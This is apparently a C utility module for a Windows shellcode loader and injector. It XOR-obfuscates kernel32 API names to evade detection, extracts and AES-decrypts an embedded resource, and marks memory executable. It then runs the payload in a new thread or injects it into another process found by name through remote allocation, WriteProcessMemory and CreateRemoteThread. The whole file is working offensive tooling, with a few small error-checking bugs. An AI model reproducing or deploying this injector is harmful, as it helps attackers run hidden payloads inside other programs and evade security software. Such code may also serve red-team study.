#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "utility.h"


int xorEncoding(PUCHAR code, DWORD codeSize, PUCHAR key, DWORD keySize, PUCHAR decoded){

    for (int i=0; i < codeSize; i++){
        decoded[i] = (UCHAR) code[i] ^ key[i % (keySize)];
    }

    return EXIT_SUCCESS;
}



int getResourceAddr(LPVOID *resAddr, DWORD *resSize, int intResource){

    HRSRC   res;
    HGLOBAL resLoaded;

    res = FindResource(NULL, MAKEINTRESOURCE(intResource), RT_RCDATA);
    if (res == NULL){
        MESSAGE(FAIL, "Impossible to find resource\n");
        PRINT_ERROR(FindResource);
        exit(EXIT_FAILURE);
    }
    resLoaded = LoadResource(NULL, res);
    if (resLoaded == NULL){
        MESSAGE(FAIL, "Impossible to load resource\n");
        PRINT_ERROR(LoadResource);
        exit(EXIT_FAILURE);
    } 
    *resAddr = (LPVOID)LockResource(resLoaded);
    if (resAddr == NULL){
        MESSAGE(FAIL, "Impossible to lock resource\n");
        PRINT_ERROR(lockResource);
        exit(EXIT_FAILURE);
    }
    *resSize = SizeofResource(NULL, res);

    return EXIT_SUCCESS;
}



int getMagicPlayer(PBYTE player, DWORD playerSize, LPVOID *realPlayer){

    BYTE    decodedPlayer[playerSize + 1];
    BYTE    referee[]   = KK;
    DWORD   refereeSize =sizeof(referee);
    FARPROC rPlayer;

    xorEncoding((PUCHAR)player, playerSize, referee, refereeSize, (PUCHAR)decodedPlayer);
    decodedPlayer[playerSize] = 0;

    rPlayer = GetProcAddress(GetModuleHandle("kernel32"), (LPCSTR)decodedPlayer);
    if(rPlayer == NULL){
        MESSAGE(FAIL, "Impossible to GetprocAddress\n");
        exit(EXIT_FAILURE);
    }
    *realPlayer = (LPVOID)rPlayer;

    MESSAGE(OKAY, "Deobfuscation of function %s done\n", decodedPlayer);

    return EXIT_SUCCESS;
}


int allowAndExecute(LPVOID codeAddr, DWORD codeSize){

    DWORD       oldProtection;
    HANDLE      threadHandle;
    VPPLAYER    vpPlayer;
    CTPlAYER    ctPlayer;
    BYTE        vp[] = VP;
    BYTE        ct[] = CT;

    getMagicPlayer(vp, sizeof(vp), (LPVOID*)&vpPlayer);
    if (vpPlayer(codeAddr, codeSize, PAGE_EXECUTE_READWRITE, &oldProtection) == 0){
        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in the current process\n");
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "Permission changed successfully at: 0x%p\n", codeAddr);

    // Run code
    MESSAGE(INFO, "Press <enter> to execute the code...");
    getchar();
    //((void(*)())codeAddr)();
    getMagicPlayer(ct, sizeof(ct), (LPVOID*)&ctPlayer);
    threadHandle = ctPlayer(NULL, codeSize, (LPTHREAD_START_ROUTINE)codeAddr, NULL, 0, NULL);
    if ( threadHandle == NULL){
        MESSAGE(FAIL, "Impossible to create thread\n");
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "Thread started\n");

    WaitForSingleObject(threadHandle, INFINITE);
    CloseHandle(threadHandle);
    
    return EXIT_SUCCESS;
}



int allowAndExecuteRemote(HANDLE  processHandle, LPVOID remoteAddr, DWORD codeSize){

    DWORD       oldProtection;
    HANDLE      threadHandle;
    VPRPLAYER   vprPlayer;
    CRTPLAYER   crtPlayer;
    BYTE        vpr[] = VPR;
    BYTE        crt[] = CRT;

    getMagicPlayer(vpr, sizeof(vpr), (LPVOID*)&vprPlayer);
    if (vprPlayer(processHandle, remoteAddr, codeSize, PAGE_EXECUTE_READWRITE, &oldProtection) == 0){
        MESSAGE(FAIL, "Impossible to change the protection of space on the remote process\n");
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "Permission successfully changed to ERW at 0x%p\n", remoteAddr);

    MESSAGE(INFO, "Press <enter> to run the code...");
    getchar();

    // Create thread to run the code remotly
    getMagicPlayer(crt, sizeof(crt), (LPVOID*)&crtPlayer);
    threadHandle = crtPlayer(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
    if ( threadHandle == NULL){
        MESSAGE(FAIL, "Impossible to create thread in the remote process\n");
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "Thread started\n");

    WaitForSingleObject(threadHandle, INFINITE);
    CloseHandle(threadHandle);

    return EXIT_SUCCESS;
}



int allocateAndCopy(LPVOID * remoteAddr, LPCVOID code, DWORD codeSize){

    VAPLAYER    vaPlayer;
    BYTE        va[] = VA;

    // Allocate bytes to process memory
    getMagicPlayer(va, sizeof(va), (LPVOID*)&vaPlayer);
    *remoteAddr = vaPlayer(NULL, codeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (*remoteAddr == NULL){
        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory\n", codeSize);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "%ld bytes of memory successfully allocated\n", codeSize);
    MESSAGE(INFO, "Press <enter> to copy data...");
    getchar();
    // Write bytes(shellcode) to the allocated memory
    memcpy(*remoteAddr, code, codeSize);
    
    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory\n", codeSize);

    return EXIT_SUCCESS;
}



int allocateAndCopyRemote(HANDLE processHandle, LPVOID *remoteAddr, LPCVOID code, DWORD codeSize){

    VARPLAYER   varPlayer;
    WPPLAYER    wpPlayer;
    BYTE        var[] = VAR;
    BYTE        wp[] = WP;

    // Allocate bytes to process memory
    getMagicPlayer(var, sizeof(var), (LPVOID*)&varPlayer);
    *remoteAddr = varPlayer(processHandle, NULL, codeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (*remoteAddr == NULL){
        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory in the remote process\n", codeSize);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "%ld bytes of memory successfully allocate in the remote process\n", codeSize);
    MESSAGE(INFO, "Press <enter> to copy data...");
    getchar();
    // Write bytes(shellcode) to process allocated memory
    getMagicPlayer(wp, sizeof(wp), (LPVOID*)&wpPlayer);
    if (wpPlayer(processHandle, *remoteAddr, code, codeSize, NULL) == 0){
        MESSAGE(FAIL, "Impossible to write data to the remote process\n");
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory of the remote process\n", codeSize);

    return EXIT_SUCCESS;
}



int getAesImportedKey(ALG_ID aesAlgo, const BYTE* algoMode, LPVOID key, DWORD keySize, BYTE initializationVector[], HCRYPTKEY *keyHandle, HCRYPTPROV *cspHandle){

    DWORD       keyBlobHeaderSize   = sizeof(BLOBHEADER);
    DWORD       dwordSize           = sizeof(DWORD);
    BYTE        keyBlob[keyBlobHeaderSize + dwordSize + keySize];
    BLOBHEADER  *keyBlobHeader;

     // Get a handle to a key container with a cryptographic service provider
    if (!CryptAcquireContext(cspHandle, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
        MESSAGE(FAIL, "Impossible to  Get a handle to a key container\n");
        PRINT_ERROR(CryptAcquireContext);
        exit(EXIT_FAILURE);
    }
    // Generate key handle by importation
    keyBlobHeader = (BLOBHEADER*)keyBlob;
    keyBlobHeader->bType = PLAINTEXTKEYBLOB;
    keyBlobHeader->bVersion = CUR_BLOB_VERSION;
    keyBlobHeader->reserved = 0;
    keyBlobHeader->aiKeyAlg = aesAlgo;
    
    memcpy(keyBlob + keyBlobHeaderSize, &keySize, dwordSize);
    memcpy(keyBlob + keyBlobHeaderSize + dwordSize, key, keySize);  

    if(!CryptImportKey(*cspHandle, keyBlob, sizeof(keyBlob), 0, 0, keyHandle)){
        MESSAGE(FAIL, "Impossible to import the key\n");
        PRINT_ERROR(CryptImportKey);
        exit(EXIT_FAILURE);
    }
    MESSAGE(OKAY, "AES Key successfully imported for use\n");

    // Set key parameter for decryption
    CryptSetKeyParam(*keyHandle, KP_IV, initializationVector, 0);
    CryptSetKeyParam(*keyHandle, KP_MODE, algoMode, 0);

    return EXIT_SUCCESS;
}


// Find a process using its name and return its PID
int findProcessPID(const PCHAR processName){

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE){
        exit(EXIT_FAILURE);
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnapshot, &pe32)){
        do{
            if (strcmp(processName, (const PCHAR)pe32.szExeFile) == 0){
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0; 
}


// Find a process using its name and return its PID and its HANDLE
int getProcessHandle(const PCHAR processName, HANDLE * processHandle, DWORD * pid){

    *pid = findProcessPID(processName);

    if (*pid != 0){

        *processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, *pid);
        if (processHandle == NULL){
            MESSAGE(FAIL, "Impossible to get handle of the process(%ld)\n", pid);
            PRINT_ERROR(OpenProcess);
            return EXIT_FAILURE;
        }
        MESSAGE(OKAY, "Handle got for process(%ld)\n", pid);

    }
    
    return EXIT_FAILURE;
}